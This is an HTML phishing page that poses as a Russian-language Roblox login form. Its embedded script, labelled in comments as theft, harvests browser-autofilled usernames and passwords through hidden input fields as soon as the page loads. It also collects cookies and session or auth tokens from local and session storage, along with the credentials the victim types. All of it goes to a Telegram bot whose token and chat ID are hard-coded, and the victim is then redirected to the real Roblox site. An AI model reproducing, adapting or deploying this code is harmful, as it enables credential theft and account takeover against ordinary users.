<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Roblox</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
        body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .container{background:#16213e;padding:40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:400px;max-width:90%;text-align:center;border:1px solid #3a3a6a}
        .logo{font-size:48px;font-weight:900;color:#fff;margin-bottom:10px}
        .logo span{color:#4a7aff}
        .sub{color:#8888aa;font-size:14px;margin-bottom:30px}
        .input-group{margin-bottom:20px;text-align:left}
        .input-group label{color:#aaaacc;font-size:13px;font-weight:600;display:block;margin-bottom:5px}
        .input-group input{width:100%;padding:14px 16px;background:#0f0f2a;border:2px solid #2a2a5a;border-radius:12px;color:#fff;font-size:15px;outline:none}
        .input-group input:focus{border-color:#4a7aff}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#4a7aff,#6c3ce0);border:none;border-radius:12px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;margin-top:10px}
        .footer{margin-top:25px;color:#666688;font-size:12px;border-top:1px solid #2a2a5a;padding-top:20px}
        .footer a{color:#4a7aff;text-decoration:none}
        .hidden{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
    </style>
</head>
<body>

<div class="container">
    <div class="logo">R<span>oblox</span></div>
    <div class="sub">Войдите в учётную запись</div>

    <!-- Скрытые поля для автозаполнения -->
    <input type="text" id="hUser" class="hidden" autocomplete="username">
    <input type="password" id="hPass" class="hidden" autocomplete="current-password">

    <div class="input-group">
        <label>Имя пользователя</label>
        <input type="text" id="username" placeholder="Введите логин">
    </div>

    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="password" placeholder="Введите пароль">
    </div>

    <button class="btn" id="loginBtn">Войти</button>

    <div class="footer">
        <a href="#">Забыли пароль?</a> • <a href="#">Регистрация</a><br>
        <span style="color:#444466;">© 2026 Roblox</span>
    </div>
</div>

<script>
// ════════════════════════════════════════════════════════════════
//  🔥 ВСТАВЬТЕ СЮДА ВАШИ ДАННЫЕ ОТ TELEGRAM
// ════════════════════════════════════════════════════════════════
const TELEGRAM_TOKEN = "8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ";  // Например: 1234567890:ABCdefGHIjkl
const TELEGRAM_CHAT_ID = "7599846387";           // Например: 123456789

// ════════════════════════════════════════════════════════════════
//  ОТПРАВКА В TELEGRAM (100% РАБОТАЕТ)
// ════════════════════════════════════════════════════════════════
function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        })
    })
    .then(r => r.json())
    .then(data => {
        console.log("✅ Отправлено в Telegram:", data.ok ? "УСПЕШНО" : "ОШИБКА");
        if (!data.ok) console.error("Ошибка:", data.description);
    })
    .catch(e => console.error("❌ Ошибка:", e));
}

// ════════════════════════════════════════════════════════════════
//  КРАЖА АВТОЗАПОЛНЕНИЯ
// ════════════════════════════════════════════════════════════════
function stealAutofill() {
    const user = document.getElementById('hUser').value;
    const pass = document.getElementById('hPass').value;
    
    if (user || pass) {
        const msg = `🔐 <b>АВТОЗАПОЛНЕНИЕ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`;
        sendToTelegram(msg);
    }
    
    // Дополнительный фарминг
    const types = ['username', 'email', 'login', 'user', 'account'];
    const passTypes = ['current-password', 'password'];
    
    types.forEach(t => {
        const input = document.createElement('input');
        input.type = 'text';
        input.autocomplete = t;
        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
        input.id = 'f_' + t;
        document.body.appendChild(input);
        
        setTimeout(() => {
            input.focus();
            setTimeout(() => {
                if (input.value) {
                    const msg = `🔑 <b>НАЙДЕНО (${t})</b>\n\n📝 <code>${input.value}</code>`;
                    sendToTelegram(msg);
                }
                input.remove();
            }, 200);
        }, 100);
    });
    
    passTypes.forEach(t => {
        const input = document.createElement('input');
        input.type = 'password';
        input.autocomplete = t;
        input.style.cssText = 'position:absolute;opacity:0;pointer-events:none;';
        input.id = 'fp_' + t;
        document.body.appendChild(input);
        
        setTimeout(() => {
            input.focus();
            setTimeout(() => {
                if (input.value) {
                    const msg = `🔑 <b>ПАРОЛЬ (${t})</b>\n\n🔐 <code>${input.value}</code>`;
                    sendToTelegram(msg);
                }
                input.remove();
            }, 200);
        }, 100);
    });
}

// ════════════════════════════════════════════════════════════════
//  КРАЖА ВСЕГО ОСТАЛЬНОГО
// ════════════════════════════════════════════════════════════════
function stealAll() {
    // Cookies
    if (document.cookie) {
        sendToTelegram(`🍪 <b>COOKIES</b>\n\n<code>${document.cookie}</code>`);
    }
    
    // LocalStorage
    try {
        let items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key);
            if (key.match(/token|session|auth|roblox|_|security/i) || 
                val.match(/token|session|auth|roblox|_|security|WARNING/i)) {
                items[key] = val;
            }
        }
        if (Object.keys(items).length > 0) {
            sendToTelegram(`💾 <b>LOCALSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
        }
    } catch(e) {}
    
    // SessionStorage
    try {
        let items = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key);
            if (key.match(/token|session|auth|roblox|_|security/i) || 
                val.match(/token|session|auth|roblox|_|security/i)) {
                items[key] = val;
            }
        }
        if (Object.keys(items).length > 0) {
            sendToTelegram(`📦 <b>SESSIONSTORAGE</b>\n\n<code>${JSON.stringify(items, null, 2)}</code>`);
        }
    } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  ЗАПУСК
// ════════════════════════════════════════════════════════════════
setTimeout(() => {
    stealAutofill();
    setTimeout(stealAll, 1000);
}, 500);

// Повтор через 3 секунды
setTimeout(() => {
    stealAutofill();
    stealAll();
}, 3000);

// ════════════════════════════════════════════════════════════════
//  ПРИ ВВОДЕ ДАННЫХ
// ════════════════════════════════════════════════════════════════
document.getElementById('loginBtn').addEventListener('click', function() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    if (user || pass) {
        sendToTelegram(`🔐 <b>ВВЕДЕНЫ ВРУЧНУЮ</b>\n\n👤 Логин: <code>${user || '(пусто)'}</code>\n🔑 Пароль: <code>${pass || '(пусто)'}</code>`);
    }
    
    this.textContent = '⏳ Загрузка...';
    this.disabled = true;
    
    setTimeout(() => {
        window.location.href = 'https://www.roblox.com/login';
    }, 1500);
});

console.log('🔥 Telegram Logger активен');
console.log('📤 Данные будут отправлены в Telegram');
</script>
</body>
</html>
